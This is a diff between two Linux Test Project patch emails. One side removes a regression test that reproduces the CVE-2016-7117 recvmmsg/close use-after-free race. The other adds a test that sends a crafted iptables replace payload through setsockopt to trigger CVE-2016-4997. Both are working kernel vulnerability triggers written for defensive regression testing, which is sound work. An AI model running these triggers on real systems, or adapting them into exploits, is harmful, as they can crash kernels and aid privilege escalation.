@@ -1,10 +1,9 @@
 From: Richard Palethorpe <rpalethorpe@suse.com>
-Date: Mon, 22 May 2017 14:13:33 +0200
-Subject: [LTP] [PATCH v2 02/10] Test for vulnerability CVE-2016-7117 in
-	recvmmsg error return path
+Date: Mon, 22 May 2017 14:13:34 +0200
+Subject: [LTP] [PATCH v2 03/10] Test for CVE-2016-4997 on setsockopt
 In-Reply-To: <20170522121341.4663-1-rpalethorpe@suse.com>
 References: <20170522121341.4663-1-rpalethorpe@suse.com>
-Message-ID: <20170522121341.4663-3-rpalethorpe@suse.com>
+Message-ID: <20170522121341.4663-4-rpalethorpe@suse.com>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
@@ -13,60 +12,19 @@ To: ltp@lists.linux.it
 
 Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
 ---
- configure.ac                  |   1 +
- m4/ltp-mmsghdr.m4             |  22 ++++++
- testcases/cve/cve-2016-7117.c | 165 ++++++++++++++++++++++++++++++++++++++++++
- 3 files changed, 188 insertions(+)
- create mode 100644 m4/ltp-mmsghdr.m4
- create mode 100644 testcases/cve/cve-2016-7117.c
+ testcases/cve/cve-2016-4997.c | 93 +++++++++++++++++++++++++++++++++++++++++++
+ 1 file changed, 93 insertions(+)
+ create mode 100644 testcases/cve/cve-2016-4997.c
 
-diff --git a/configure.ac b/configure.ac
-index ecc9a2699..ddfc683a3 100644
---- a/configure.ac
-+++ b/configure.ac
-@@ -189,5 +189,6 @@ LTP_CHECK_EPOLL_PWAIT
- LTP_CHECK_KEYUTILS_SUPPORT
- LTP_CHECK_SYNC_ADD_AND_FETCH
- LTP_CHECK_BUILTIN_CLEAR_CACHE
-+LTP_CHECK_MMSGHDR
- 
- AC_OUTPUT
-diff --git a/m4/ltp-mmsghdr.m4 b/m4/ltp-mmsghdr.m4
+diff --git a/testcases/cve/cve-2016-4997.c b/testcases/cve/cve-2016-4997.c
 new file mode 100644
-index 000000000..05522180e
+index 000000000..69424e1a5
 --- /dev/null
-+++ b/m4/ltp-mmsghdr.m4
-@@ -0,0 +1,22 @@
-+dnl Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
-+dnl
-+dnl This program is free software;  you can redistribute it and/or modify
-+dnl it under the terms of the GNU General Public License as published by
-+dnl the Free Software Foundation; either version 2 of the License, or
-+dnl (at your option) any later version.
-+dnl
-+dnl This program is distributed in the hope that it will be useful,
-+dnl but WITHOUT ANY WARRANTY;  without even the implied warranty of
-+dnl MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See
-+dnl the GNU General Public License for more details.
-+dnl
-+dnl You should have received a copy of the GNU General Public License
-+dnl along with this program. If not, see <http://www.gnu.org/licenses/>.
-+
-+AC_DEFUN([LTP_CHECK_MMSGHDR],[
-+AC_CHECK_TYPES([struct mmsghdr],,,[
-+#define _GNU_SOURCE
-+#include <sys/types.h>
-+#include <sys/socket.h>
-+])
-+])
-diff --git a/testcases/cve/cve-2016-7117.c b/testcases/cve/cve-2016-7117.c
-new file mode 100644
-index 000000000..721e31a45
---- /dev/null
-+++ b/testcases/cve/cve-2016-7117.c
-@@ -0,0 +1,165 @@
++++ b/testcases/cve/cve-2016-4997.c
+@@ -0,0 +1,93 @@
 +/*
 + * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
++ * Based on repro-compatReleaseEntry.c by NCC group
 + *
 + * This program is free software: you can redistribute it and/or modify
 + * it under the terms of the GNU General Public License as published by
@@ -82,153 +40,80 @@ index 000000000..721e31a45
 + * along with this program. If not, see <http://www.gnu.org/licenses/>.
 + */
 +/*
-+ * CVE-2016-7117
++ * Test for CVE-2016-4997
 + *
-+ * This tests for a use after free caused by a race between recvmmsg() and
-+ * close(). The exit path for recvmmsg() in (a2e2725541f: net: Introduce
-+ * recvmmsg socket syscall) called fput() on the active file descriptor before
-+ * checking the error state and setting the socket's error field.
++ * For a full explanation of how the vulnerability works see:
++ * https://github.com/nccgroup/TriforceLinuxSyscallFuzzer/tree/master/crash_reports/report_compatIpt
 + *
-+ * If one or more messages are received by recvmmsg() followed by one which
-+ * fails, the socket's error field will be set. If just after recvmmsg() calls
-+ * fput(), a call to close() is made on the same file descriptor there is a
-+ * race between close() releasing the socket object and recvmmsg() setting its
-+ * error field.
-+ *
-+ * fput() does not release a file descriptor's resources (e.g. a socket)
-+ * immediatly, it queues them to be released just before a system call returns
-+ * to user land. So the close() system call must call fput() after it is
-+ * called in recvmmsg(), exit and release the resources all before the socket
-+ * error is set.
-+ *
-+ * Usually if the vulnerability is present the test will be killed with a
-+ * kernel null pointer exception. However this is not guaranteed to happen
-+ * every time.
-+ *
-+ * The following was used for reference
-+ * https://blog.lizzie.io/notes-about-cve-2016-7117.html
++ * The original vulnerability was present in the 32-bit compatibility system
++ * call, so the test should be compiled with -m32 and run on a 64-bit kernel.
++ * For simplicities sake the test requests root privliges instead of creating
++ * a user namespace.
 + */
 +
-+#include <sys/wait.h>
 +#include <sys/types.h>
 +#include <sys/socket.h>
-+#include <sys/syscall.h>
-+#include <stdlib.h>
-+#include <errno.h>
++#include <netinet/in.h>
++#include <net/if.h>
++#include <limits.h>
++#include <linux/netfilter_ipv4/ip_tables.h>
 +
 +#include "tst_test.h"
 +#include "tst_safe_net.h"
-+#include "tst_safe_pthread.h"
-+#include "tst_timer.h"
-+#include "tst_fuzzy_sync.h"
++#include "tst_kernel.h"
 +
-+/* The bug was present in the kernel before recvmmsg was exposed by glibc */
-+#include "linux_syscall_numbers.h"
++#define TOO_SMALL_OFFSET 74
++#define OFFSET_OVERWRITE 0xFFFF
++#define NEXT_OFFSET (sizeof(struct ipt_entry)		\
++		     + sizeof(struct xt_entry_match)	\
++		     + sizeof(struct xt_entry_target))
++#define PADDING (OFFSET_OVERWRITE - NEXT_OFFSET)
 +
-+#define MSG "abcdefghijklmnop"
-+#define RECV_TIMEOUT 1
-+#define ATTEMPTS 0x1FFFFF
-+
-+#ifndef HAVE_STRUCT_MMSGHDR
-+struct mmsghdr {
-+	struct msghdr msg_hdr;
-+	unsigned int msg_len;
++struct payload {
++	struct ipt_replace repl;
++	struct ipt_entry ent;
++	struct xt_entry_match match;
++	struct xt_entry_target targ;
++	char padding[PADDING];
++	struct xt_entry_target targ2;
 +};
-+#endif
-+
-+static int socket_fds[2];
-+static struct mmsghdr msghdrs[2] = {
-+	{
-+		.msg_hdr = {
-+			.msg_iov = &(struct iovec) {
-+				.iov_len = sizeof(MSG),
-+			},
-+			.msg_iovlen = 1
-+		}
-+	},
-+	{
-+		.msg_hdr = {
-+			.msg_iov = &(struct iovec) {
-+				.iov_base = (void *)(0xbadadd),
-+				.iov_len = ~0,
-+			},
-+			.msg_iovlen = 1
-+		}
-+	}
-+};
-+static char rbuf[sizeof(MSG)];
-+static struct timespec timeout = { .tv_sec = RECV_TIMEOUT };
-+static struct tst_fzsync_pair fzsync_pair;
 +
 +static void setup(void)
 +{
-+	tst_fzsync_pair_init(&fzsync_pair);
-+}
-+
-+static void cleanup(void)
-+{
-+	close(socket_fds[0]);
-+	close(socket_fds[1]);
-+}
-+
-+static void *send_and_close(void *arg)
-+{
-+	send(socket_fds[0], MSG, sizeof(MSG), 0);
-+	send(socket_fds[0], MSG, sizeof(MSG), 0);
-+
-+	tst_fzsync_delay_b(&fzsync_pair);
-+
-+	close(socket_fds[0]);
-+	close(socket_fds[1]);
-+	tst_fzsync_time_b(&fzsync_pair);
-+
-+	return arg;
++	if (tst_kernel_bits() == 32 || sizeof(long) > 4)
++		tst_res(TCONF,
++			"The vulnerability was only present in 32-bit compat mode");
 +}
 +
 +static void run(void)
 +{
-+	pthread_t pt_send;
-+	int i, stat, too_early_count = 0;
++	int ret, sock_fd;
++	struct payload p = { 0 };
 +
-+	msghdrs[0].msg_hdr.msg_iov->iov_base = (void *)&rbuf;
++	sock_fd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, 0);
 +
-+	for (i = 1; i < ATTEMPTS; i++) {
-+		if (socketpair(AF_LOCAL, SOCK_DGRAM, 0, socket_fds))
-+			tst_brk(TBROK | TERRNO, "Socket creation failed");
++	strncpy(p.match.u.user.name, "icmp", sizeof(p.match.u.user.name));
++	p.match.u.match_size = OFFSET_OVERWRITE;
 +
-+		SAFE_PTHREAD_CREATE(&pt_send, 0, send_and_close, 0);
++	p.ent.next_offset = NEXT_OFFSET;
++	p.ent.target_offset = TOO_SMALL_OFFSET;
 +
-+		tst_fzsync_delay_a(&fzsync_pair);
++	p.repl.num_entries = 2;
++	p.repl.num_counters = 1;
++	p.repl.size = sizeof(struct payload);
++	p.repl.valid_hooks = 0;
 +
-+		stat = tst_syscall(__NR_recvmmsg,
-+				   socket_fds[1], msghdrs, 2, 0, &timeout);
-+		tst_fzsync_time_a(&fzsync_pair);
-+		if (stat < 0 && errno == EBADF)
-+			too_early_count++;
-+		else if (stat == 0)
-+			tst_res(TWARN, "No messages received, should be one");
-+		else if (stat < 0)
-+			tst_res(TWARN | TERRNO, "recvmmsg failed unexpectedly");
-+
-+		SAFE_PTHREAD_JOIN(pt_send, 0);
-+
-+		tst_fzsync_pair_update(i, &fzsync_pair);
-+		if (!(i & 0x7FFFF)) {
-+			tst_res(TINFO, "Too early: %.1f%%",
-+				100 * too_early_count / (float)i);
-+			tst_fzsync_pair_info(&fzsync_pair);
-+		}
-+	}
-+
-+	tst_res(TPASS, "Nothing happened after %d attempts", ATTEMPTS);
++	ret = setsockopt(sock_fd, SOL_IP, IPT_SO_SET_REPLACE,
++			 &p, sizeof(struct payload));
++	tst_res(TPASS | TERRNO, "We didn't cause a crash, setsockopt returned %d", ret);
 +}
 +
 +static struct tst_test test = {
-+	.tid = "cve-2016-7117",
-+	.test_all = run,
++	.tid = "cve-2016-4997",
++	.min_kver = "2.6.32",
 +	.setup = setup,
-+	.cleanup = cleanup,
-+	.min_kver = "2.6.33",
++	.test_all = run,
++	.needs_root = 1,
 +};
 -- 
 2.12.2
